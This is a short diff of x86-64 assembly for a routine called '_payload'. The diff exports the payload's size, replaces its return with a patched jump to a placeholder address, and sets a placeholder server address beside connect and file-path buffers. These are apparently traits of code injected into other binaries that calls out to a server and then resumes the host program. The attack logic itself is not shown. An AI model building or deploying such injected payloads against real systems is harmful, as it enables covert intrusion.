@@ -1,7 +1,7 @@
 [BITS 64]
 
 global _payload
-; extern port, addr_ip
+global _payload_size
 
 %macro pushx 1-*
 %rep %0
@@ -95,11 +95,12 @@ _payload:
 	syscall
 
 	popx rax, rdi, rsi, rdx, r10
-	; jmp     0x0
-	ret
+	jmp     0x0
+	; ret
 
 STATBUFFER		times 144 db 0
 CONNECT_BUFFER	times 16 db 0
 FILEPATH		times 1024 db 0
 SERVER_PORT		dd 0x0
-SERVER_ADDR		dw 0x0
+SERVER_ADDR		dw 0x4242
+_payload_size:	dq $-_payload
